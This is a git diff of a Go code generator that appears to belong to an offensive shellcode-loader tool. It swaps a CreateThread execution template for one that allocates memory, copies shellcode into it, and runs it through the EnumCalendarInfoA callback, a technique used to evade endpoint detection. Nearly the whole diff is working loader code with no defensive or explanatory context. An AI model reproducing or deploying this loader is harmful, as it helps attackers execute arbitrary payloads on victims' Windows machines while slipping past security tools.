@@ -5,18 +5,19 @@ import (
 	"strings"
 )
 
-type CreateTTemplate struct{}
+type EnumCalendarTemplate struct {
+}
 
-func (t CreateTTemplate) Import() string {
+func (t EnumCalendarTemplate) Import() string {
 	return fmt.Sprintf(`
 import (
-	"syscall"
-	"unsafe"
+    "syscall"
+    "unsafe"
 )
 `)
 }
 
-func (t CreateTTemplate) Const() string {
+func (t EnumCalendarTemplate) Const() string {
 	return fmt.Sprintf(`
 const (
 	MEM_COMMIT             = 0x1000
@@ -28,20 +29,22 @@ var (
 	kernel32        = syscall.MustLoadDLL("kernel32.dll")
 	ntdll           = syscall.MustLoadDLL("ntdll.dll")
 
-    WaitForSingleObject = kernel32.MustFindProc("WaitForSingleObject")
 	VirtualAlloc        = kernel32.MustFindProc("VirtualAlloc")
-	CreateThread        = kernel32.MustFindProc("CreateThread")
+	EnumCalendarInfoA   = kernel32.MustFindProc("EnumCalendarInfoA")
+	RtlCopyMemory       = ntdll.MustFindProc("RtlCopyMemory")
 
-    RtlCopyMemory   = ntdll.MustFindProc("RtlCopyMemory")
+	LOCALE_USER_DEFAULT = 0x0400
+	ENUM_ALL_CALENDARS  = 0xFFFFFFFF
+	CAL_SMONTHNAME1     = 0x00000015
 )
 `)
 }
 
-func (t CreateTTemplate) Init() string {
-	return fmt.Sprintf(``)
+func (t EnumCalendarTemplate) Init() string {
+	return ""
 }
 
-func (t CreateTTemplate) Process() string {
+func (t EnumCalendarTemplate) Process() string {
 	return fmt.Sprintf(`
 	addr, _, _ := VirtualAlloc.Call(
 		0,
@@ -55,23 +58,16 @@ func (t CreateTTemplate) Process() string {
 		uintptr(len(shellcode)),
 	)
 
-    threadAddr, _, _ := CreateThread.Call(
-		0,
-		0,
+	_, _, _ = EnumCalendarInfoA.Call(
 		addr,
-		0,
-		0,
-		0,
+		(uintptr)(LOCALE_USER_DEFAULT),
+		(uintptr)(ENUM_ALL_CALENDARS),
+		(uintptr)(CAL_SMONTHNAME1),
 	)
-
-    WaitForSingleObject.Call(
-        threadAddr,
-        0xFFFFFFFF,
-    )
 `)
 }
 
-func (t CreateTTemplate) GetTemplate(targetProcess string) string {
+func (t EnumCalendarTemplate) GetTemplate(targetProcess string) string {
 	InformProcessUnused(targetProcess)
 
 	var template = `
@@ -83,16 +79,14 @@ __CONST__STATEMENT__
 
 func ExecuteOrderSixtySix(shellcode []byte) {
 
-__IMPORT__INIT__	
-
 __IMPORT__PROCESS__
 	
 }
-    `
+`
 	template = strings.Replace(template, "__IMPORT__STATEMENT__", t.Import(), -1)
 	template = strings.Replace(template, "__CONST__STATEMENT__", t.Const(), -1)
 	template = strings.Replace(template, "__IMPORT__INIT__", t.Init(), -1)
 	template = strings.Replace(template, "__IMPORT__PROCESS__", t.Process(), -1)
 
-	return strings.Replace(template, "__PROCESS__", targetProcess, -1)
+	return template
 }
